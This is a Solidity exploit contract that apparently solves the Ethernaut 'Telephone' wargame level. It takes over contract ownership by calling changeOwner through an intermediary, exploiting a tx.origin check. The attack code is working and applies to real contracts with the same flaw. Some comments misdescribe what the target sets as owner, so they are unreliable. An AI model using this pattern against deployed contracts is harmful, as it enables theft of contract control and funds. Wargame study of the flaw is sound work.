// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title TelephoneExploit
 * @notice Exploit contract for Ethernaut Level 4: Telephone
 * @dev Vulnerability: Uses tx.origin for authentication instead of msg.sender
 * 
 * Attack Flow:
 * 1. Deploy this exploit contract with the target Telephone address
 * 2. Call exploit() which calls changeOwner() on the Telephone contract
 * 3. Telephone checks tx.origin (original sender) vs msg.sender (this contract)
 * 4. Since tx.origin is the attacker's EOA, they become the new owner
 * 
 * The key vulnerability: tx.origin != msg.sender when calling through a proxy
 */
contract TelephoneExploit {
    // Target contract interface
    ITelephone public target;
    
    // Attacker address (EOA that will become owner)
    address public attacker;
    
    constructor(address _target) {
        target = ITelephone(_target);
        attacker = msg.sender;
    }
    
    /**
     * @notice Execute the exploit
     * @dev Calls changeOwner on target, passing tx.origin as new owner
     * The target contract incorrectly uses tx.origin for authentication
     */
    function exploit() external {
        // Call changeOwner on the target contract
        // target will set owner = tx.origin (the EOA that called this function)
        target.changeOwner(attacker);
    }
    
    /**
     * @notice Get current owner of target contract
     */
    function getTargetOwner() external view returns (address) {
        return target.owner();
    }
}

/**
 * @title ITelephone
 * @notice Interface for the vulnerable Telephone contract
 */
interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}
